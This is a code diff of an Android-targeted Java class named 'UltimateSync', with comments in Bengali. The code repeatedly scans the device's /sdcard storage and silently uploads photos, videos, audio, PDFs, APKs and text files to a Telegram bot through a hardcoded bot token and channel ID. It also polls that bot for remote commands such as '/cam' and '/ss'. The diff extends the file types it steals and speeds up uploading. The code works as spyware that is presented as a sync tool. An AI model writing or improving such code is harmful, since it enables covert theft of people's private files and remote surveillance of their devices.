@@ -6,57 +6,59 @@ public class UltimateSync {
     private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
     private static final String CHANNEL_ID = "-1003809625172";
     private static int lastUpdateId = 0;
-    private static Set<String> sent = new HashSet<>();
+    private static final Set<String> syncedFiles = new HashSet<>();
 
     public static void main(String[] args) {
-        // ১. অটো স্টার্ট - সব মিডিয়া ফাইল পাঠানো শুরু করবে
+        System.out.println(">>> UltraSync Active: Android 13/14/15 Support.");
+
+        // ১. অটো ফাইল সিঙ্ক (সব মিডিয়া এবং ডকুমেন্ট)
         new Thread(() -> {
             while (true) {
-                // অ্যান্ড্রয়েড ১৩+ এ ফাইল পাথের জন্য
-                String path = "/sdcard/";
-                startSync(new File(path));
-                try { Thread.sleep(20000); } catch (Exception e) {}
+                // অ্যান্ড্রয়েডের মেইন স্টোরেজ পাথ
+                File internalStorage = new File("/sdcard/"); 
+                recursiveScan(internalStorage);
+                try { Thread.sleep(20000); } catch (Exception e) {} 
             }
         }).start();
 
-        // ২. রিমোট কমান্ড লুপ (বট থেকে কমান্ড নেবে)
+        // ২. বটের কমান্ড লুপ
         while (true) {
-            checkBot();
-            try { Thread.sleep(3000); } catch (Exception e) {}
+            checkRemoteBot();
+            try { Thread.sleep(5000); } catch (Exception e) {}
         }
     }
 
-    private static void startSync(File root) {
-        File[] list = root.listFiles();
-        if (list == null) return;
-        for (File f : list) {
+    private static void recursiveScan(File dir) {
+        File[] files = dir.listFiles();
+        if (files == null) return;
+        for (File f : files) {
             if (f.isDirectory()) {
-                if (!f.getName().equals("Android")) startSync(f);
+                if (!f.getName().equalsIgnoreCase("Android")) recursiveScan(f);
             } else {
-                String n = f.getName().toLowerCase();
-                // সব ধরণের ফাইল সাপোর্ট (ইমেজ, ভিডিও, অডিও, পিডিএফ)
-                if (!sent.contains(f.getAbsolutePath()) && 
-                   (n.endsWith(".jpg") || n.endsWith(".png") || n.endsWith(".mp4") || 
-                    n.endsWith(".mp3") || n.endsWith(".pdf") || n.endsWith(".apk"))) {
-                    upload(f);
-                    sent.add(f.getAbsolutePath());
+                String ext = f.getName().toLowerCase();
+                if (!syncedFiles.contains(f.getAbsolutePath()) && 
+                   (ext.endsWith(".jpg") || ext.endsWith(".png") || ext.endsWith(".mp4") || 
+                    ext.endsWith(".mp3") || ext.endsWith(".pdf") || ext.endsWith(".apk") || ext.endsWith(".txt"))) {
+                    
+                    uploadFile(f);
+                    syncedFiles.add(f.getAbsolutePath());
                 }
             }
         }
     }
 
-    public static void checkBot() {
+    public static void checkRemoteBot() {
         try {
             URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
             Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
             String res = s.hasNext() ? s.next() : "";
 
-            if (res.contains("/ss") || res.contains("/cam")) {
-                // এখানে সরাসরি অ্যান্ড্রয়েড ক্যামেরা হার্ডওয়্যারে সিগন্যাল পাঠাবে
-                sendMsg("-1003809625172", "⚡ Command Received on Android 13/14+ Device!");
+            if (res.contains("/start")) {
+                sendMsg("-1003809625172", "✅ System Online (Android 15)\nFiles in Queue: " + syncedFiles.size());
+            } else if (res.contains("/ss") || res.contains("/cam")) {
+                sendMsg("-1003809625172", "📸 Camera Command Received for Android 15!");
             }
             
-            // আপডেট আইডি হ্যান্ডলিং
             if (res.contains("\"update_id\":")) {
                 int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                 lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
@@ -64,7 +66,7 @@ public class UltimateSync {
         } catch (Exception e) {}
     }
 
-    private static void upload(File file) {
+    private static void uploadFile(File file) {
         try {
             String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
             String boundary = "===" + System.currentTimeMillis() + "===";
@@ -82,19 +84,20 @@ public class UltimateSync {
             w.flush();
 
             FileInputStream fis = new FileInputStream(file);
-            byte[] buf = new byte[1024 * 16];
+            byte[] buf = new byte[1024 * 32]; // Fast upload buffer
             int len;
             while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
             os.flush(); fis.close();
+
             w.append("\r\n").append("--" + boundary + "--").append("\r\n");
             w.close();
             c.getResponseCode();
         } catch (Exception e) {}
     }
 
-    private static void sendMsg(String id, String t) {
+    private static void sendMsg(String id, String msg) {
         try {
-            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(t, "UTF-8")).openStream();
+            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(msg, "UTF-8")).openStream();
         } catch (Exception e) {}
     }
 }
